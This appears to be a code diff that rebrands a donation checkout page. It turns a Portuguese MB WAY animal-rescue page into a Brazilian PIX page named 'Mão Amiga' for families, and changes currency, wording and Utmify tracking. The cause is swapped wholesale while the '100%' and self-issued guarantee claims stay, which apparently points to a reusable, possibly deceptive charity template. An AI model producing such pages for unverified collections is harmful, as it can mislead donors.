@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="pt-PT">
+<html lang="pt-BR">
 <head>
   <meta charset="UTF-8" />
   <!-- Utmify UTMs -->
@@ -20,7 +20,7 @@
     document.head.appendChild(a);
   </script>
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Doação Segura — Alaar</title>
+  <title>Doação Segura — Mão Amiga</title>
   <link rel="preconnect" href="https://fonts.googleapis.com" />
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
   <link href="https://fonts.googleapis.com/css2?family=Inter:ital,wght@0,400;0,500;0,600;0,700;0,800;0,900;1,400&display=swap" rel="stylesheet" />
@@ -806,7 +806,7 @@
     </a>
 
     <span class="header-logo">
-      <img src="/logo-coracao.png" alt="Coração Solidário" />
+      <span style="font-size:1rem;font-weight:900;letter-spacing:-.02em;color:#006E65;">Mão Amiga</span>
     </span>
 
     <span class="header-secure">
@@ -825,9 +825,9 @@
         <!-- Donation hero / amount banner -->
         <div class="donation-hero">
           <div class="donation-hero-left">
-            <p class="donation-campaign">Resgate Animal · Ajuda Urgente</p>
-            <p class="donation-amount" id="display-amount">€—</p>
-            <p class="donation-amount-sub">Donativo único · 100% para os patudos</p>
+            <p class="donation-campaign">Causas Sociais · Ajuda Urgente</p>
+            <p class="donation-amount" id="display-amount">R$—</p>
+            <p class="donation-amount-sub">Doação única · 100% para as famílias</p>
           </div>
           <div class="donation-badge">
             <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.75" stroke-linecap="round" stroke-linejoin="round"><path d="M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z"/><path d="m9 12 2 2 4-4"/></svg>
@@ -840,57 +840,20 @@
 
           <p class="section-label">Método de pagamento</p>
 
-          <!-- Method toggle -->
-          <div class="method-grid" role="radiogroup" aria-label="Método de pagamento">
-            <button class="method-btn active" id="btn-mbway" role="radio" aria-checked="true" type="button">
-              <div class="method-logo">
-                <span class="mbway-logo">MB WAY</span>
-              </div>
-              <span class="method-name">MB WAY</span>
-              <span class="method-desc">Confirmação na app em 4 min</span>
-            </button>
-
-            <button class="method-btn" id="btn-mb" role="radio" aria-checked="false" type="button">
-              <div class="method-logo">
-                <span class="mb-logo">MULTI<br>BANCO</span>
-              </div>
-              <span class="method-name">Multibanco</span>
-              <span class="method-desc">Referência ATM · válida 3 dias</span>
-            </button>
+          <!-- PIX info box -->
+          <div class="mb-info-box" style="background:#f0fdf4;border-color:#86efac;">
+            <svg viewBox="0 0 24 24" fill="none" stroke="#16a34a" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="M12 16v-4"/><path d="M12 8h.01"/></svg>
+            <p style="color:#15803d;">Você será redirecionado para o pagamento via <strong>PIX</strong>. Rápido, seguro e confirmado em segundos.</p>
           </div>
 
           <hr class="divider" />
 
-          <!-- ── MB WAY: phone input ── -->
-          <div id="form-mbway">
-            <div class="field-wrap">
-              <div class="field-label">
-                <span>Número de telemóvel</span>
-              </div>
-              <div class="input-wrap">
-                <input
-                  type="tel"
-                  id="phone-input"
-                  class=""
-                  placeholder="912 345 678"
-                  maxlength="11"
-                  autocomplete="tel-national"
-                  inputmode="numeric"
-                  aria-describedby="phone-hint phone-err"
-                />
-              </div>
-              <p class="hint" id="phone-hint">9 dígitos · começa por 9 · ex: 912 345 678</p>
-              <p class="err" id="phone-err" role="alert"></p>
-            </div>
-          </div>
-
-          <!-- ── Multibanco: no extra input ── -->
-          <div id="form-mb" class="hidden">
-            <div class="mb-info-box">
-              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="M12 16v-4"/><path d="M12 8h.01"/></svg>
-              <p>Será gerada uma referência Multibanco válida por <strong>3 dias</strong>. Podes pagar em qualquer ATM ou via homebanking.</p>
-            </div>
-          </div>
+          <!-- Hidden inputs kept for JS compatibility -->
+          <div id="form-mbway" class="hidden"></div>
+          <div id="form-mb" class="hidden"></div>
+          <!-- Dummy elements for JS compat -->
+          <input type="hidden" id="phone-input" />
+          <p class="err hidden" id="phone-err" role="alert"></p>
 
           <!-- Global error -->
           <div class="global-error hidden" id="global-error" role="alert">
@@ -901,7 +864,7 @@
           <!-- Pay CTA -->
           <button class="btn-pay" id="pay-btn" type="button">
             <svg id="pay-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M19 14c1.49-1.46 3-3.21 3-5.5A5.5 5.5 0 0 0 16.5 3c-1.76 0-3 .5-4.5 2-1.5-1.5-2.74-2-4.5-2A5.5 5.5 0 0 0 2 8.5c0 2.3 1.5 4.05 3 5.5l7 7Z"/></svg>
-            <span id="pay-label">Pagar com MB WAY</span>
+            <span id="pay-label">Pagar via PIX</span>
           </button>
 
           <!-- Trust signals -->
@@ -913,12 +876,12 @@
             <span class="trust-dot"></span>
             <span class="trust-item">
               <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z"/><path d="m9 12 2 2 4-4"/></svg>
-              Garantia MbWay
+              Garantia Mão Amiga
             </span>
             <span class="trust-dot"></span>
             <span class="trust-item">
               <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M19 14c1.49-1.46 3-3.21 3-5.5A5.5 5.5 0 0 0 16.5 3c-1.76 0-3 .5-4.5 2-1.5-1.5-2.74-2-4.5-2A5.5 5.5 0 0 0 2 8.5c0 2.3 1.5 4.05 3 5.5l7 7Z"/></svg>
-              100% para os animais
+              100% para as famílias
             </span>
           </div>
         </div>
@@ -936,7 +899,7 @@
 
             <h2>Aguardando confirmação</h2>
             <p>
-              Abre a app <strong>MB WAY</strong> e confirma o pagamento de
+              Conclua o pagamento via <strong>PIX</strong> no valor de
               <span class="mbway-amount-pill" id="waiting-amount">—</span>
             </p>
 
@@ -953,12 +916,12 @@
 
             <div class="warn-box">
               <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3Z"/><path d="M12 9v4"/><path d="M12 17h.01"/></svg>
-              <p>Não feches esta página. Serás redirecionado automaticamente após a confirmação.</p>
+              <p>Não feche esta página. Você será redirecionado automaticamente após a confirmação.</p>
             </div>
 
             <button class="btn-ghost" id="cancel-mbway-btn" type="button">
               <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="width:14px;height:14px"><path d="m15 18-6-6 6-6"/></svg>
-              Cancelar e escolher outro método
+              Cancelar
             </button>
 
           </div>
@@ -1042,7 +1005,7 @@
 
   <!-- ─── FOOTER ────────────────────────────────────────────────────────── -->
   <footer class="site-footer">
-    🔒 Pagamento processado de forma segura pela <strong>MbWay</strong> · Coração Solidário © 2026
+    🔒 Pagamento processado de forma segura via <strong>PIX</strong> · Mão Amiga © 2026
   </footer>
 
 </div><!-- /.page -->
@@ -1097,11 +1060,11 @@
   const amountEl = document.getElementById('display-amount');
 
   if (!s.amount || s.amount < 1 || s.amount > 5000) {
-    amountEl.textContent = '€—';
-    showGlobalError('Valor inválido. Volta à campanha e tenta novamente.');
+    amountEl.textContent = 'R$—';
+    showGlobalError('Valor inválido. Volte à campanha e tente novamente.');
     document.getElementById('pay-btn').disabled = true;
   } else {
-    amountEl.textContent = '€' + s.amount.toFixed(2).replace('.', ',');
+    amountEl.textContent = 'R$ ' + s.amount.toFixed(2).replace('.', ',');
 
     /* Utmify — InitiateCheckout: retry até pixel carregar (máx 3s) */
     (function fireIC(amount) {
@@ -1109,7 +1072,7 @@
       var t = setInterval(function () {
         attempts++;
         if (typeof window.utmify === 'function') {
-          window.utmify('track', 'InitiateCheckout', { value: amount, currency: 'EUR' });
+          window.utmify('track', 'InitiateCheckout', { value: amount, currency: 'BRL' });
           clearInterval(t);
         } else if (attempts >= 15) {
           clearInterval(t);
@@ -1128,54 +1091,13 @@
   const payBtn    = document.getElementById('pay-btn');
   const payLabel  = document.getElementById('pay-label');
 
-  /* ── Method switch ── */
-  function selectMethod(m) {
-    s.method = m;
-    const isMbway = m === 'mbway';
-
-    btnMbway.classList.toggle('active', isMbway);
-    btnMbway.setAttribute('aria-checked', String(isMbway));
-    btnMb.classList.toggle('active', !isMbway);
-    btnMb.setAttribute('aria-checked', String(!isMbway));
-
-    formMbway.classList.toggle('hidden', !isMbway);
-    formMb.classList.toggle('hidden', isMbway);
-
-    payLabel.textContent = isMbway ? 'Pagar com MB WAY' : 'Gerar referência Multibanco';
-    clearErrors();
-  }
-
-  btnMbway.addEventListener('click', () => selectMethod('mbway'));
-  btnMb.addEventListener('click',    () => selectMethod('multibanco'));
-
-  /* ── Phone: digits only ── */
-  phoneIn.addEventListener('input', () => {
-    const digits = phoneIn.value.replace(/\D/g, '').slice(0, 9);
-    phoneIn.value = digits.length > 6
-      ? digits.slice(0, 3) + ' ' + digits.slice(3, 6) + ' ' + digits.slice(6)
-      : digits.length > 3
-        ? digits.slice(0, 3) + ' ' + digits.slice(3)
-        : digits;
-    phoneIn.classList.remove('field-error');
-    phoneErr.classList.remove('show');
-  });
+  /* PIX-only: method always mbway (maps to pix in utmify.js) */
+  s.method = 'mbway';
 
   /* ── Pay button ── */
   payBtn.addEventListener('click', async () => {
     clearErrors();
-    if (s.method === 'mbway') {
-      const phone = phoneIn.value.replace(/\s/g, '');
-      if (!/^9\d{8}$/.test(phone)) {
-        phoneIn.classList.add('field-error');
-        phoneErr.textContent = 'Número inválido — deve ter 9 dígitos e começar por 9.';
-        phoneErr.classList.add('show');
-        phoneIn.focus();
-        return;
-      }
-      await flowMbway(phone);
-    } else {
-      await flowMultibanco();
-    }
+    await flowMbway('');
   });
 
   /* ════════════════════════════════════
@@ -1192,12 +1114,12 @@
 
       showStep('step-mbway-waiting');
       document.getElementById('waiting-amount').textContent =
-        '€' + s.amount.toFixed(2).replace('.', ',');
+        'R$ ' + s.amount.toFixed(2).replace('.', ',');
 
       startCountdown(240); // 4 min
       startPolling();
     } catch (e) {
-      showGlobalError(e.message || 'Ocorreu um erro. Tenta novamente.');
+      showGlobalError(e.message || 'Ocorreu um erro. Tente novamente.');
     } finally {
       setLoading(false);
     }
@@ -1269,15 +1191,15 @@
       document.getElementById('mb-entity').textContent    = mb.entity;
       document.getElementById('mb-reference').textContent = fmt(mb.reference);
       document.getElementById('mb-amount').textContent    =
-        '€' + Number(mb.amount).toFixed(2).replace('.', ',');
+        'R$ ' + Number(mb.amount).toFixed(2).replace('.', ',');
 
       const exp = new Date(mb.expiresAt);
-      const expiresStr = exp.toLocaleDateString('pt-PT', { day:'2-digit', month:'long', year:'numeric' });
+      const expiresStr = exp.toLocaleDateString('pt-BR', { day:'2-digit', month:'long', year:'numeric' });
       document.querySelector('#mb-expires-text span').textContent = `Válida até ${expiresStr}`;
 
       showStep('step-mb-ref');
     } catch (e) {
-      showGlobalError(e.message || 'Ocorreu um erro. Tenta novamente.');
+      showGlobalError(e.message || 'Ocorreu um erro. Tente novamente.');
     } finally {
       setLoading(false);
     }
@@ -1308,7 +1230,7 @@
   document.getElementById('mb-check-btn').addEventListener('click', async () => {
     const btn = document.getElementById('mb-check-btn');
     btn.disabled = true;
-    btn.querySelector('span').textContent = 'A verificar…';
+    btn.querySelector('span').textContent = 'Verificando…';
     try {
       const r = await get(`/api/payments/status?transactionId=${s.transactionId}`);
       goReturn(r.status === 'paid' ? 'success' : 'pending');
@@ -1342,11 +1264,11 @@
     const iconSlot = document.getElementById('pay-icon');
     if (on) {
       if (iconSlot) iconSlot.outerHTML = '<div class="spin" id="pay-icon"></div>';
-      payLabel.textContent = 'A processar…';
+      payLabel.textContent = 'Processando…';
     } else {
       const spin = document.getElementById('pay-icon');
       if (spin) spin.outerHTML = `<svg id="pay-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" style="width:17px;height:17px;flex-shrink:0"><path d="M19 14c1.49-1.46 3-3.21 3-5.5A5.5 5.5 0 0 0 16.5 3c-1.76 0-3 .5-4.5 2-1.5-1.5-2.74-2-4.5-2A5.5 5.5 0 0 0 2 8.5c0 2.3 1.5 4.05 3 5.5l7 7Z"/></svg>`;
-      payLabel.textContent = s.method === 'mbway' ? 'Pagar com MB WAY' : 'Gerar referência Multibanco';
+      payLabel.textContent = 'Pagar via PIX';
       payBtn.disabled = false;
     }
   }
